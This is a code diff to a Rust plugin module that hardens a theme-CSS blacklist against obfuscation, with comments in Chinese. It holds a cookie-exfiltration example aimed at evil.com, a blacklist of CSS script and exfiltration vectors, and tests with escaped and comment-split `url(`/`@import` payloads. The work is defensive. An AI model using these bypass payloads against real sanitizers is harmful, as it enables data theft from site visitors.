@@ -62,33 +62,107 @@ pub fn scan_imports(module: &Module) -> Result<(), String> {
   }
 }
 
-/// theme CSS 黑名单 pattern。命中任何一个 = 整段 CSS 拒绝（不进 `<style>`）。
+/// theme CSS **黑名单** pattern（注意：是 blacklist，不是 allowlist）。
+/// 命中任何一个 = 整段 CSS 拒绝（不进 `<style>`）。
 ///
-/// 字符串小写匹配，不是完整 CSS parser —— 已知攻击模式有限且固定，正则也够用，
-/// 但简单 `contains` 更易读 + 性能足够（每次 page render 跑一次，CSS 通常 < 8KB）。
+/// S8（风险 R5）：匹配前先过 [`normalize_css_for_scan`] 规范化（解码 CSS
+/// 转义 + 去注释 + 去空白 + 小写），封堆 `\75rl(`、`url( http://`、
+/// `url(/**/http://` 等混淆绕过。仍不是完整 CSS parser，但规范化 +
+/// 整段拒绝（fail-closed）下，误拒优于漏放。彻底方案是属性/函数白名单
+/// 解析器（待 lightningcss 等依赖成本可接受时升级）。
 ///
 /// 攻击场景：
 /// - `url(http://evil.com/?cookie=...)` —— CSS 注入做数据外渗（受害者浏览器
 ///   主动发请求，攻击者拿到 referrer / cookie / IP）
 /// - `@import url(...)` —— 同上
-/// - `expression(...)` / `behavior:` —— 老 IE 攻击向量，遗留考虑
+/// - `expression(...)` / `behavior:` / `-moz-binding:` —— 老引擎脚本执行向量
 /// - `javascript:` / `vbscript:` —— 在 `url()` / `content` 等场景下能执行
+///
+/// pattern 不含空白（规范化已去除全部空白）；带引号变体因此也合并进
+/// `url('http://` 等无空白形式。
 const THEME_CSS_BLACKLIST: &[&str] = &[
   "url(http://",
   "url(https://",
   "url(//",
   "url('http://",
   "url('https://",
+  "url('//",
   "url(\"http://",
   "url(\"https://",
+  "url(\"//",
   "@import",
   "expression(",
   "behavior:",
+  "-moz-binding:",
   "javascript:",
   "vbscript:",
 ];
 
-/// 检查 theme CSS 是否包含危险 pattern（大小写不敏感）。
+/// S8：扫描前规范化 CSS，对抗混淆：
+/// 1. 去除 `/* ... */` 注释（防 token 分割）
+/// 2. 解码 CSS 转义 `\HH...`（1-6 位 hex + 可选空白）与 `\<char>` 字面转义
+///    （防 `\75 rl(` → `url(` 绕过）
+/// 3. 去除全部空白（防 `url( http://` 绕过；合法 CSS 语义不依赖被扫描
+///    副本的空白，原串不变）
+/// 4. 小写化
+///
+/// 只用于安全扫描；命中与否都不修改原 CSS。
+fn normalize_css_for_scan(css: &str) -> String {
+  let mut out = String::with_capacity(css.len());
+  let mut chars = css.chars().peekable();
+  while let Some(c) = chars.next() {
+    // 注释：/* ... */ 整段丢弃
+    if c == '/' && chars.peek() == Some(&'*') {
+      chars.next(); // 吃掉 '*'
+      let mut prev = '\0';
+      for cc in chars.by_ref() {
+        if prev == '*' && cc == '/' {
+          break;
+        }
+        prev = cc;
+      }
+      continue;
+    }
+    // CSS 转义：\HH...（1-6 hex）+ 可选一个空白；或 \<char> 字面
+    if c == '\\' {
+      let mut hex = String::new();
+      while hex.len() < 6 {
+        match chars.peek() {
+          Some(h) if h.is_ascii_hexdigit() => {
+            hex.push(*h);
+            chars.next();
+          }
+          _ => break,
+        }
+      }
+      if hex.is_empty() {
+        // \<char> 字面转义：保留下一个字符本身
+        if let Some(next) = chars.next() {
+          if !next.is_whitespace() {
+            out.extend(next.to_lowercase());
+          }
+        }
+      } else {
+        // hex 转义后的一个空白属于转义序列，吃掉
+        if chars.peek().map(|w| w.is_whitespace()).unwrap_or(false) {
+          chars.next();
+        }
+        if let Some(decoded) = u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
+          out.extend(decoded.to_lowercase());
+        }
+      }
+      continue;
+    }
+    if c.is_whitespace() {
+      continue;
+    }
+    out.extend(c.to_lowercase());
+  }
+  out
+}
+
+/// 检查 theme CSS 是否包含危险 pattern（规范化后匹配，对抗大小写 /
+/// 转义 / 空白 / 注释混淆）。
 ///
 /// 返回命中的 pattern 列表；空 vec 表示通过。调用者命中时应跳过该插件 CSS
 /// 整段（不部分清洗），同时记 warn 日志。
@@ -97,8 +171,8 @@ const THEME_CSS_BLACKLIST: &[&str] = &[
 /// - `url(/assets/...)` —— 站内相对路径
 /// - `url(data:image/png;base64,...)` —— 内联 base64 图片（CSP 配合限制 MIME）
 pub fn sanitize_theme_css(css: &str) -> Vec<&'static str> {
-  let lower = css.to_lowercase();
-  THEME_CSS_BLACKLIST.iter().filter(|pat| lower.contains(*pat)).copied().collect()
+  let normalized = normalize_css_for_scan(css);
+  THEME_CSS_BLACKLIST.iter().filter(|pat| normalized.contains(*pat)).copied().collect()
 }
 
 /// 校验 manifest 声明的 capability 与 wasm 实际 exports 是否对齐。
@@ -298,6 +372,64 @@ mod tests {
   fn css_sanitize_case_insensitive() {
     let css = "body { background: URL(HTTP://EVIL.COM/x); }";
     assert!(!sanitize_theme_css(css).is_empty());
+  }
+
+  // ─── S8：混淆绕过场景 ──────────────────────────────
+
+  /// `url(` 后带空白是合法 CSS，旧实现匹配不到。
+  #[test]
+  fn css_sanitize_rejects_url_with_whitespace() {
+    let css = "body { background: url(  http://evil.com/x ); }";
+    assert!(!sanitize_theme_css(css).is_empty(), "空白混淆应被拦截");
+  }
+
+  /// CSS hex 转义：`\75 rl(` 解码后是 `url(`。
+  #[test]
+  fn css_sanitize_rejects_hex_escaped_url() {
+    let css = r"body { background: \75 rl(http://evil.com/x); }";
+    assert!(!sanitize_theme_css(css).is_empty(), "hex 转义混淆应被拦截");
+  }
+
+  /// 字面转义：`\u\r\l(` 解码后是 `url(`。
+  #[test]
+  fn css_sanitize_rejects_literal_escaped_url() {
+    let css = r"body { background: \u\r\l(http://evil.com/x); }";
+    assert!(!sanitize_theme_css(css).is_empty(), "字面转义混淆应被拦截");
+  }
+
+  /// hex 转义拼 @import：`@\69mport`。
+  #[test]
+  fn css_sanitize_rejects_escaped_import() {
+    let css = r"@\69mport 'https://evil.com/x.css';";
+    assert!(!sanitize_theme_css(css).is_empty(), "转义 @import 应被拦截");
+  }
+
+  /// 注释 + 空白分割：`url(/**/ http://`。
+  #[test]
+  fn css_sanitize_rejects_comment_split_url() {
+    let css = "body { background: url(/* x */ http://evil.com/x); }";
+    assert!(!sanitize_theme_css(css).is_empty(), "注释分割应被拦截");
+  }
+
+  /// 带引号 + 空白：`url( 'http://`。
+  #[test]
+  fn css_sanitize_rejects_quoted_url_with_whitespace() {
+    let css = "body { background: url( 'http://evil.com/x' ); }";
+    assert!(!sanitize_theme_css(css).is_empty());
+  }
+
+  /// 老 Firefox XBL 向量。
+  #[test]
+  fn css_sanitize_rejects_moz_binding() {
+    let css = ".x { -moz-binding: url(/xbl.xml#x); }";
+    assert!(!sanitize_theme_css(css).is_empty());
+  }
+
+  /// 规范化不应误伤合法 CSS（含注释 / 多空白 / data URL）。
+  #[test]
+  fn css_sanitize_normalization_keeps_legit_css_clean() {
+    let css = "/* theme: ocean */\n:root {\n  --color-primary: #0ea5e9;\n}\n.logo { background: url( data:image/png;base64,iVBORw0KG ); }\n.banner { background: url( /assets/banner.png ); }";
+    assert!(sanitize_theme_css(css).is_empty(), "合法 CSS 不应误拒");
   }
 
   // ─── verify_manifest_consistency ─────────────────────────
